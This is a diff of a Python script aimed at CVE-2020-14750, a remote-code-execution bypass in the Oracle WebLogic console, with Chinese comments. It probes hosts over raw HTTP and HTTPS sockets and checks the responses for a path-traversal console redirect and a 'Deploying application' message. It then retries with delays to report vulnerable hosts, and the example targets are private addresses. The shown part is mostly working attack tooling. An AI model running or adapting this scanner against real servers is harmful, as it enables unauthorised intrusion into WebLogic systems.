@@ -3,11 +3,11 @@
 #CVE-2020-14750(Console-RCE //绕过CVE-2020-18443)
 
 import socket
-import ssl
+import ssl,time
 
 socket.setdefaulttimeout(1) 
 
-def check(ip,port):
+def run(ip,port):
     try:
         client1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #基于http
         client1.connect((ip,int(port)))
@@ -21,10 +21,13 @@ def check(ip,port):
             except socket.error as e:
                 break
         client1.close()
-        if "&#37;2e&#37;2e&#37;2Fconsole.portal" and "HTTP/1.1 302" in buf1:
-            return ip,port
+        #print(buf1)
+        if "&#37;2e&#37;2e&#37;2Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1"  in buf1:
+            return 2
+        if "Deploying application" in buf1:
+            return 1
     except socket.error as e:
-        pass
+    	pass
     
     try:
         client2 = ssl.wrap_socket(socket.socket())                   #基于https
@@ -39,11 +42,23 @@ def check(ip,port):
             except socket.error as e:
                 break
         client2.close() 
-        if "&#37;2e&#37;2e&#37;2Fconsole.portal" and "HTTP/1.1 302" in buf1:
-            return ip,port
+        if "&#37;2e&#37;2e&#37;2Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1"  in buf1:
+            return 2 
+        if "Deploying application" in buf1:
+            return 1      
     except socket.error as e:
         pass
-       
-if __name__=='__main__':
-    print (check('10.243.66.207'))
 
+def check(ip,port):
+    if run(ip,port)==1:
+        time.sleep(5)
+        run(ip,port)
+        time.sleep(5)
+        run(ip,port)
+        if run(ip,port)==2:
+            return ip,port
+    if run(ip,port)==2:
+        return ip,port
+
+if __name__=='__main__':
+    print(check('192.168.231.130','7001'))
